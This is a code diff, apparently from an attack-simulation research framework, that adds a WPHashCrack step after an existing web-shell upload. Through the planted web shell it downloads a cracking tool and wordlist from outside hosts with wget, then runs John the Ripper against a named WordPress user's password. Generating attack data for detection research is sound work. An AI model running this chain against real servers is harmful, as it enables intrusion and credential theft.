@@ -24,8 +24,10 @@ import requests
 
 from bs4 import BeautifulSoup
 from pwnlib.tubes.listen import listen
+from pydantic import HttpUrl
 from structlog.stdlib import BoundLogger
 
+from cr_kyoushi.simulation.model import ApproximateFloat
 from cr_kyoushi.simulation.util import (
     sleep,
     sleep_until,
@@ -508,6 +510,126 @@ class UploadWebShell:
                 log.error("Unable to retrieve nonce")
         else:
             log.error("No post to upload shell to")
+
+
+class WPHashCrack:
+    """Transition function uses WP hash cracker to find employee password."""
+
+    def __init__(
+        self,
+        hashcrack_url: HttpUrl,
+        file_name: str,
+        wl_url: HttpUrl,
+        wl_name: str,
+        attacked_user: str,
+        tar_download_name: str = None,
+        cmd_param: str = "wp_meta",
+        verify: bool = False,
+        timeout: Optional[float] = None,
+        sleep_time: Union[ApproximateFloat, float] = 3.0,
+    ):
+        """
+        Args:
+            hashcrack_url: url of the hashcrack tar.
+            file_name: name of the hashcrack tar.
+            wl_url: address of the host where wordlist is available.
+            wl_name: name of the wordlist.
+            attacked_user: the name of the WP user to crack the password.
+            tar_download_name: the name of the hashcrack tar after downloading.
+            cmd_param: the GET parameter to embed the command in.
+            verify: if HTTPS connection should very TLS certs.
+            timeout: the maximum time to wait for the web server to respond.
+            sleep_time: the waiting time between executed requests.
+        """
+        self.url = hashcrack_url
+        self.file_name = file_name
+        self.wl_url = wl_url
+        self.wl_name = wl_name
+        self.attacked_user = attacked_user
+        self.tar_download_name = tar_download_name
+        self.cmd_param = cmd_param
+        self.verify = verify
+        self.timeout = timeout
+        self.sleep_time = sleep_time
+
+    def __call__(
+        self,
+        log: BoundLogger,
+        current_state: str,
+        context: Context,
+        target: Optional[str],
+    ):
+        web_shell = context.web_shell
+        log = log.bind(
+            url=self.url,
+            wl_url=self.wl_url,
+            attacked_user=self.attacked_user,
+            web_shell=web_shell,
+        )
+        if web_shell is not None:
+            archive_download_cmd = ["wget", str(self.url)]
+            if self.tar_download_name is not None:
+                archive_download_cmd += ["-O", self.tar_download_name]
+            log.info("Downloading WPHashCrack")
+            output = send_request(
+                log,
+                web_shell,
+                archive_download_cmd,
+                self.cmd_param,
+                self.verify,
+                self.timeout,
+            )
+            log.info("Downloaded WPHashCrack")
+            log.info("Web shell command response", output=output)
+            sleep(self.sleep_time)
+            if self.tar_download_name is None:
+                self.tar_download_name = self.file_name
+            log.info("Unarchiving WPHashCrack")
+            output = send_request(
+                log,
+                web_shell,
+                ["tar", "xvfz", self.tar_download_name],
+                self.cmd_param,
+                self.verify,
+                self.timeout,
+            )
+            log.info("Unarchived WPHashCrack")
+            log.info("Web shell command response", output=output)
+            sleep(self.sleep_time)
+            log.info("Downloading password list")
+            output = send_request(
+                log,
+                web_shell,
+                ["wget", str(self.wl_url)],
+                self.cmd_param,
+                self.verify,
+                self.timeout,
+            )
+            log.info("Downloaded password list")
+            log.info("Web shell command response", output=output)
+            sleep(self.sleep_time)
+            log.info("Running WPHashCrack")
+            output = send_request(
+                log,
+                web_shell,
+                [
+                    "./wphashcrack-0.1/wphashcrack.sh",
+                    "-w",
+                    "$PWD/" + self.wl_name,
+                    "-j",
+                    "./wphashcrack-0.1/john-1.7.6-jumbo-12-Linux64/run",
+                    "-u",
+                    self.attacked_user,
+                ],
+                self.cmd_param,
+                self.verify,
+                self.timeout,
+            )
+            log.info("Finished WPHashCrack")
+            log.info("Web shell command response", output=output)
+        else:
+            log.error("Missing web shell url")
+            raise Exception("No web shell to execute at")
 
 
 def encode_cmd(cmd: List[str]) -> str:
